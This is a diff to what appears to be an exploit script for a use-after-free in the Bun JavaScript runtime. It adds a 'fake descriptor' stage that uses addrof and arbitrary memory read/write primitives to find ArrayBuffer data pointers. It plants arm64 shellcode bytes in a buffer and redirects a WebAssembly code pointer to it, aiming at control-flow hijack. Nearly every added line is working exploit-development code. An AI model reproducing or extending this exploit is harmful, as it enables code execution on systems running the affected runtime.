@@ -32,6 +32,9 @@ const wasmExecField = Number(process.env.WASM_EXEC_FIELD || 24);
 const wasmCodeField = Number(process.env.WASM_CODE_FIELD || 24);
 const markerImport = process.env.MARKER_IMPORT === "1";
 const markerPath = process.env.MARKER_PATH || "/tmp/bun_uaf_noffi_wasm_marker";
+const fakeDescriptor = process.env.FAKE_DESCRIPTOR === "1";
+const fakeDescriptorMode = process.env.FAKE_DESCRIPTOR_MODE || "replacement";
+const fakeDescriptorWordEnv = process.env.FAKE_DESCRIPTOR_WORD;
 const patchScope = process.env.PATCH_SCOPE || (markerImport ? "cell" : "exec");
 const patchField = Number(process.env.PATCH_FIELD || (patchScope === "cell" ? 48 : wasmCodeField));
 const readBytes = Number(process.env.READ_BYTES || 64);
@@ -310,6 +313,21 @@ function writeU64Address(address, value) {
   writeAddress(address, payloadU64(value));
 }
 
+async function arrayBufferDataPointer(buffer) {
+  const wrapperAddress = await addrof(buffer);
+  const wrapperPrefix = readAddress(wrapperAddress, 64);
+  const metadataAddress = readU64LEBytes(wrapperPrefix, 16);
+  const metadataPrefix = readAddress(metadataAddress, 64);
+  const dataAddress = readU64LEBytes(metadataPrefix, 16);
+  return {
+    wrapperAddress,
+    metadataAddress,
+    dataAddress,
+    wrapperWords: wordsFromBytes(wrapperPrefix),
+    metadataWords: wordsFromBytes(metadataPrefix),
+  };
+}
+
 function makeWasmExports() {
   let markerArmed = false;
   const wasm = markerImport
@@ -408,6 +426,72 @@ if (patchField < 0 || patchField + 8 > patchA.bytes.length || patchField + 8 > p
 const patchAddress = patchA.address + BigInt(patchField);
 const originalPatchValue = readU64LEBytes(patchA.bytes, patchField);
 const replacementPatchValue = readU64LEBytes(patchB.bytes, patchField);
+let effectiveReplacementPatchValue = replacementPatchValue;
+let fakeDescriptorSummary = null;
+
+if (fakeDescriptor) {
+  if (patchScope !== "cell" || patchField !== 48) {
+    throw new Error("FAKE_DESCRIPTOR requires PATCH_SCOPE=cell and PATCH_FIELD=48");
+  }
+
+  const originalDescriptorBytes = readAddress(originalPatchValue, 8);
+  const replacementDescriptorBytes = readAddress(replacementPatchValue, 8);
+  const originalDescriptorWord = readU64LEBytes(originalDescriptorBytes, 0);
+  const replacementDescriptorWord = readU64LEBytes(replacementDescriptorBytes, 0);
+  let shellcodeData = null;
+
+  let fakeDescriptorWord;
+  switch (fakeDescriptorMode) {
+    case "original":
+      fakeDescriptorWord = originalDescriptorWord;
+      break;
+    case "replacement":
+      fakeDescriptorWord = replacementDescriptorWord;
+      break;
+    case "custom":
+      if (!fakeDescriptorWordEnv) throw new Error("FAKE_DESCRIPTOR_MODE=custom requires FAKE_DESCRIPTOR_WORD");
+      fakeDescriptorWord = BigInt(fakeDescriptorWordEnv);
+      break;
+    case "data-ret": {
+      const shellcodeBuffer = new ArrayBuffer(16);
+      const shellcodeBytes = new Uint8Array(shellcodeBuffer);
+      shellcodeBytes.set([0xc0, 0x03, 0x5f, 0xd6]); // arm64 ret
+      shellcodeData = await arrayBufferDataPointer(shellcodeBuffer);
+      fakeDescriptorWord = shellcodeData.dataAddress;
+      break;
+    }
+    case "zero":
+      fakeDescriptorWord = 0n;
+      break;
+    default:
+      throw new Error("FAKE_DESCRIPTOR_MODE must be original, replacement, custom, data-ret, or zero");
+  }
+
+  const fakeDescriptorBuffer = new ArrayBuffer(8);
+  const fakeDescriptorBytes = new Uint8Array(fakeDescriptorBuffer);
+  fakeDescriptorBytes.set(payloadU64(fakeDescriptorWord));
+  const fakeDescriptorData = await arrayBufferDataPointer(fakeDescriptorBuffer);
+  effectiveReplacementPatchValue = fakeDescriptorData.dataAddress;
+  fakeDescriptorSummary = {
+    mode: fakeDescriptorMode,
+    bufferAddress: hex(fakeDescriptorData.wrapperAddress),
+    metadataAddress: hex(fakeDescriptorData.metadataAddress),
+    dataAddress: hex(fakeDescriptorData.dataAddress),
+    originalDescriptorPointer: hex(originalPatchValue),
+    originalDescriptorWord: hex(originalDescriptorWord),
+    originalDescriptorWordClass: classifyPointer(originalDescriptorWord),
+    replacementDescriptorPointer: hex(replacementPatchValue),
+    replacementDescriptorWord: hex(replacementDescriptorWord),
+    replacementDescriptorWordClass: classifyPointer(replacementDescriptorWord),
+    shellcodeData: shellcodeData && {
+      bufferAddress: hex(shellcodeData.wrapperAddress),
+      metadataAddress: hex(shellcodeData.metadataAddress),
+      dataAddress: hex(shellcodeData.dataAddress),
+    },
+    fakeDescriptorWord: hex(fakeDescriptorWord),
+    fakeDescriptorWordClass: classifyPointer(fakeDescriptorWord),
+  };
+}
 
 let patchedA;
 let restoredA;
@@ -416,7 +500,7 @@ let restoreError;
 let patchError;
 
 try {
-  writeU64Address(patchAddress, replacementPatchValue);
+  writeU64Address(patchAddress, effectiveReplacementPatchValue);
   if (markerImport) armMarker();
   patchedA = a();
 } catch (error) {
@@ -455,6 +539,9 @@ const output = {
   markerPath: markerImport ? markerPath : undefined,
   markerBefore,
   markerAfter,
+  fakeDescriptor,
+  fakeDescriptorMode: fakeDescriptor ? fakeDescriptorMode : undefined,
+  fakeDescriptorSummary,
   wasmExecField,
   wasmCodeField,
   patchScope,
@@ -465,6 +552,8 @@ const output = {
   originalPatchClass: classifyPointer(originalPatchValue),
   replacementPatchValue: hex(replacementPatchValue),
   replacementPatchClass: classifyPointer(replacementPatchValue),
+  effectiveReplacementPatchValue: hex(effectiveReplacementPatchValue),
+  effectiveReplacementPatchClass: classifyPointer(effectiveReplacementPatchValue),
   warmIterations,
   victimAddress: hex(native.victimAddress),
   wrapperAddress: hex(native.wrapperAddress),
